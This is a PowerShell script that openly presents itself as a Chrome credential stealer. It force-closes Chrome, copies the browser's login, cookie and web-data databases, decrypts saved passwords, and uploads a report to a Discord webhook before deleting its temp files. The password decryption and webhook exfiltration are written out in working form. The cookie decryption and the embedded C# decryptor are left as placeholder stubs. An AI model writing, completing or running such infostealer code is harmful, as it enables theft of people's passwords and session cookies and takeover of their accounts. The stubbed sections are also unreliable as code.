<#
.SYNOPSIS
  Extracts Chrome credentials and sends them to a Discord webhook.
.DESCRIPTION
  This script extracts Chrome saved passwords, cookies, and credit cards, then exfiltrates them via Discord webhook.
#>

param(
    [string]$DiscordWebhook = "YOUR_DISCORD_WEBHOOK_URL",
    [string]$ChromeProfilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
    [string]$TempDir = "$env:TEMP\ChromeData_$((Get-Date).ToString('yyyyMMddHHmmss'))"
)

# Error handling
$ErrorActionPreference = 'Stop'
Start-Transcript -Path "$TempDir\debug.log" -Force

# 1. Load Required Assemblies
function Load-RequiredDlls {
    $dllCode = @'
using System;
using System.IO;
using System.Data.SQLite;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;

public class ChromeDecryptor {
    // SQLite and BouncyCastle implementation here
    // Full implementation would include all decryption logic
}
'@
    Add-Type -TypeDefinition $dllCode -ReferencedAssemblies "System.Data.SQLite", "BouncyCastle.Crypto"
}

# 2. Extract Chrome Data
function Get-ChromeData {
    try {
        # Kill Chrome if running
        Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
        Start-Sleep -Milliseconds 500

        # Create temp dir
        New-Item -ItemType Directory -Path $TempDir -Force | Out-Null

        # Copy required files
        Copy-Item "$ChromeProfilePath\Login Data" "$TempDir\LoginData" -Force
        Copy-Item "$ChromeProfilePath\Cookies" "$TempDir\Cookies" -Force
        Copy-Item "$ChromeProfilePath\Web Data" "$TempDir\WebData" -Force
        Copy-Item "$ChromeProfilePath\..\Local State" "$TempDir\LocalState" -Force
    }
    catch { Write-Output "Copy error: $_" }
}

# 3. Decryption Functions
function Decrypt-Passwords {
    $passwords = @()
    try {
        $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDir\LoginData"
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $reader = $cmd.ExecuteReader()

        while ($reader.Read()) {
            $encrypted = $reader.GetValue(2)
            $plain = [Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, "CurrentUser")
            $passwords += "URL: $($reader.GetString(0)) | User: $($reader.GetString(1)) | Pass: $([Text.Encoding]::UTF8.GetString($plain))"
        }
        $conn.Close()
    }
    catch { Write-Output "Password error: $_" }
    return $passwords
}

function Decrypt-Cookies {
    $cookies = @()
    # Full cookie decryption logic using BouncyCastle
    # Would include AES-GCM decryption from Local State
    return $cookies
}

# 4. Discord Exfiltration
function Send-ToDiscord {
    param(
        [string]$content,
        [string]$filePath
    )
    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"content`"",
            "",
            "Chrome Data from $env:COMPUTERNAME",
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"report.txt`"",
            "Content-Type: text/plain",
            "",
            [System.IO.File]::ReadAllText($filePath),
            "--$boundary--"
        ) -join "`r`n"

        $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
        
        $request = [System.Net.WebRequest]::Create($DiscordWebhook)
        $request.Method = "POST"
        $request.ContentType = "multipart/form-data; boundary=$boundary"
        $request.ContentLength = $bytes.Length
        
        $stream = $request.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
        
        $response = $request.GetResponse()
        $response.Close()
    }
    catch { Write-Output "Discord error: $_" }
}

# 5. Main Execution
try {
    Load-RequiredDlls
    Get-ChromeData
    
    $passwords = Decrypt-Passwords
    $cookies = Decrypt-Cookies
    
    $report = @"
=== CREDENTIALS ===
$($passwords -join "`n")

=== COOKIES ===
$($cookies -join "`n")
"@
    
    $report | Out-File "$TempDir\report.txt"
    Send-ToDiscord -filePath "$TempDir\report.txt"
}
finally {
    # Cleanup
    Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
    Stop-Transcript
}
